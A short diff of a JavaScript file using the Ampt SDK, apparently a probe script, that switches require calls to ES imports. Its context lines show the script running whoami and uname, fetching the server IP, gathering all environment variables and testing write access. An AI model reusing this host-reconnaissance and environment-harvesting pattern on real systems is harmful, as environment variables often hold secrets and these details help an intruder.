@@ -1,9 +1,9 @@
 import { http } from "@ampt/sdk";
 
-const reqor = require("https");
-const { spawn } = require("child_process");
-const fs = require("fs");
-const { isNumber, isNullOrUndefined } = require("util");
+import https  from "https" ;
+import { spawn }  from "child_process" ;
+import fs  from "fs" ;
+import { isNumber, isNullOrUndefined }  from "util";
 
 const zenno = [
     new Date().toISOString() + " z " + Math.random(),
@@ -121,7 +121,7 @@ function keepAlive() {
 
 runCommand("whoami", [], zenno, 2);
 runCommand("uname", ["-a"], zenno, 3);
-getServerIp(reqor, zenno, 4);
+getServerIp(https, zenno, 4);
 zenno[5] = getAllEnvars();
 zenno[6] = testWrite();
 
